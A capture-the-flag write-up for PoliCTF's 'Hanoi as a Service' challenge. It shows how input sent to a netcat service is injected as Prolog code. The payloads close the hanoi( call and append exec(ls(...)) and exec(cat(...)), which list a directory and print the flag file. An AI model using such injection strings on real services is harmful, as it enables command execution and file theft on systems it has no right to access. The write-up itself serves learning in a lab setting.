### HANOI AS A SERVICE  
##### 50 points
Question
--
Check out our shiny new HaaS platform!  
`nc haas.polictf.it 80`

Readings
--
* https://en.wikipedia.org/wiki/Tower_of_Hanoi
* https://en.wikipedia.org/wiki/Prolog

Answer
--
Lets see what the service does:  
```
$ nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
3
* Move top disk from a to b
* Move top disk from a to c
* Move top disk from b to c
* Move top disk from a to b
* Move top disk from c to a
* Move top disk from c to b
* Move top disk from a to b
```
It seems there is a code to solve [hanoi problem](https://en.wikipedia.org/wiki/Tower_of_Hanoi). Now we try to give it some wrong input:  
```
$ nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
hello hanoi
ERROR: Prolog initialisation failed:
ERROR: Syntax error: Operator expected
ERROR: hanoi(hello
ERROR: ** here **
ERROR: hanoi) .
```
It seems the code is written in [Prolog](https://en.wikipedia.org/wiki/Prolog) so now try to inject some codes:  
```
$ nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
3), write('hello hanoi\n'
* Move top disk from a to b
* Move top disk from a to c
* Move top disk from b to c
* Move top disk from a to b
* Move top disk from c to a
* Move top disk from c to b
* Move top disk from a to b
hello hanoi
```  
Now we try to see files in the home directory of `hass`:  
```
$ nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
3), exec(ls('/home/ctf/haas')), write('\n'
* Move top disk from a to b
* Move top disk from a to c
* Move top disk from b to c
* Move top disk from a to b
* Move top disk from c to a
* Move top disk from c to b
* Move top disk from a to b
haas
haas-proxy.py
jhknsjdfhef_flag_here
```
Oh yes there is a file named `jhknsjdfhef_flag_here` in the working directory so we try to see the contents:  
```
$ nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
3), exec(cat('/home/ctf/haas/jhknsjdfhef_flag_here')), write('\n'
* Move top disk from a to b
* Move top disk from a to c
* Move top disk from b to c
* Move top disk from a to b
* Move top disk from c to a
* Move top disk from c to b
* Move top disk from a to b
flag{Pr0gramm1ng_in_l0g1c_1s_c00l}
```  

##### Flag: `flag{Pr0gramm1ng_in_l0g1c_1s_c00l}`
